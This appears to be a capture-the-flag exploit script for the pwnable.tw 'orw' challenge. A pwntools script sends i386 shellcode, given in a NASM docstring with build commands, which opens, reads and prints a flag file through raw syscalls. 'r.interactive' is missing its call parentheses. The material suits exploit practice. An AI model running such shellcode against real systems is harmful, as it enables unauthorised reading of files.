#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = remote('chall.pwnable.tw', 10001)
#r = process('/tmp/p/a')
sh = open('/tmp/del/a.bin').read()
r.sendlineafter(':', sh)

r.interactive

"""
; nasm -felf32 a.asm -o a.o
; ld a.o -o a -melf_i386
; objcopy -O binary a.o a.bin

jmp sh
orw:
	pop ebx			; open()
	mov eax, 5
	int 0x80

	mov ebx, eax	; read()
	mov ecx, esp
	mov edx, 100
	mov eax, 3
	int 0x80

	mov edx, eax	; write()
	mov ebx, 1
	mov eax, 4
	int 0x80

	mov eax, 1		; exit()
	xor ebx, ebx
	int 0x80

sh:
	call orw
	db '/home/orw/flag', 0

"""